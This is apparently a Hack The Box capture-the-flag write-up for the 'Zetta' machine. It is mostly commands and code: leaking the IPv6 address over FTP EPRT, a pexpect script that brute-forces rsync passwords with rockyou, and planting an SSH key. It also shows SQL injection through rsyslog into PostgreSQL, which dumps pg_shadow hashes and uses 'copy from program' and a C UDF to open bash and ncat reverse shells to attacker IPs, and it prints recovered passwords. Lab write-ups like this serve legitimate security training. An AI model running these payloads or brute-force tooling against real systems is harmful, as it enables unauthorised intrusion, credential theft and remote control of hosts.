## USER


~$ ifconfig tun0
and grep ipv6 address (dead.beaf:::)

to get IPv6 address (base on RFC2428):
~$ telnet 10.10.10.156 21
user 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
pass 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
eprt |2|dead:beef::::1|1234|
list

and use wireshark to watch the traffic, then grab the IPv6 remote address.

we can list rsync modules, which include /etc and we can download it except for some files.

rsyncd.conf gives us complete module list which also includes password protected home_roy.

to brute it is possible to use pexpect from python 
```
import pexpect
import sys


with open("/usr/share/wordlists/rockyou.txt","r") as rockyou:
    passwds = list(rockyou.readlines())

for passwd in passwds:
    passwd = passwd.strip()
    p = pexpect.spawn('bash -c "RSYNC_PASSWORD=\'%s\' rsync -avzp -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy home/"' % (passwd))
    line = p.read()
    sys.stdout.write('.')
    sys.stdout.flush()
    if not 'ERROR' in line:
        print("found it: " + passwd)
        break
    p.close()
```

root@rascal:~/htb/boxes/Zetta# python exploit.py                                                                                                                          
...................................................................................found it: computer


## ROOT


~$ RSYNC_PASSWORD='computer' rsync -avzp zetta.pub -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy/.ssh/authorized_keys

~$ find / -newermt 2019-07-20
to find several hidden .git repos


roy@zetta:/etc/rsyslog.d$ git show
commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
Author: root <root@zetta.htb>
Date:   Sat Jul 27 05:51:43 2019 -0400

    Adding/adapting template from manual.

diff --git a/pgsql.conf b/pgsql.conf
index f31836d..9649f68 100644
--- a/pgsql.conf
+++ b/pgsql.conf
@@ -1,5 +1,22 @@
 ### Configuration file for rsyslog-pgsql
 ### Changes are preserved

-module (load="ompgsql")
-*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
+# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
+#
+# Used default template from documentation/source but adapted table
+# name to syslog_lines so the Ruby on Rails application Maurice is
+# coding can use this as SyslogLine object.
+#
+template(name="sql-syslog" type="list" option.sql="on") {
+  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
+  property(name="msg")
+  constant(value="','")
+  property(name="timereported" dateformat="pgsql" date.inUTC="on")
+  constant(value="')")
+}
+
+# load module
+module(load="ompgsql")
+
+# Only forward local7.info for testing.
+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")


and here is a way to execute this:
roy@zetta:~$ logger -p local7.info "', now()); copy (select * from pg_catalog.pg_tables) to \$\$/var/tmp/hereyougo\$\$;-- '"; cat /var/log/postgresql/postgresql-11-main.log;ls /var/tmp

postgres user's hash:
roy@zetta:/var/tmplogger -p local7.info "', now()); copy (SELECT usename, passwd FROM pg_shadow) to \$\$/var/tmp/hereyougo\$\$;-- '"
roy@zetta:/var/tmp$ cat /var/tmp/hereyougo 
postgres        md5743fa0a8feb9a1f8e54b404a98ac6355

improve all this to get reverse shell (just wrapped all this to a file and run with bash):
echo 'bash -c "bash -i &> /dev/tcp/10.10.14.82/4006 0>&1"' > /var/tmp/sh.sh
logger -p local7.info "', now());create table t (id text); copy t from program \$\$bash /var/tmp/sh.sh\$\$;drop table t;-- '"

after shell was landed i fetched id_rsa from .ssh of postgres user
and logged in using normal ssh shell

postgres@zetta:~$ cat .psql_history
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';

file '/home/roy/.tudu.xml' said something about password scheme represented by '<secret>@userid'

and it turned out that root password is 'sup3rs3cur3p4ass@root'

..rooted!


PS.
logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); CREATE FUNCTION sys(cstring) RETURNS int AS $\$/tmp/pg_exec.so$\$, $\$pg_exec$\$ LANGUAGE $\$c$\$ STRICT; -- " logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); select sys($\$/tmp/ncat -e /bin/sh 10.10.14.28 8888$\$); -- " 
